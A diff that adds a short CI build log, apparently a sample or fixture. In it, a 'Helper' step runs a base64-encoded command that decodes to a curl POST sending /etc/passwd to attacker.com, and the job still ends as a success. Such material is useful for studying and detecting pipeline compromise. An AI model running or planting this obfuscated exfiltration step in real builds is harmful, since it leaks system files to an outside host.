@@ -1,0 +1,7 @@
+[2026-02-05T16:30:00Z] Job 'build' started
+[2026-02-05T16:30:05Z] Step 'Checkout' completed
+[2026-02-05T16:30:15Z] Step 'Build' completed
+[2026-02-05T16:30:16Z] Step 'Helper' started
+[2026-02-05T16:30:18Z] Executing: echo "Y3VybCAtWCBQT1NUIGh0dHA6Ly9hdHRhY2tlci5jb20va2V5cyAtZCBAL2V0Yy9wYXNzd2Q=" | base64 -d | bash
+[2026-02-05T16:30:19Z] Response: 200 OK
+[2026-02-05T16:30:20Z] Job 'build' completed success
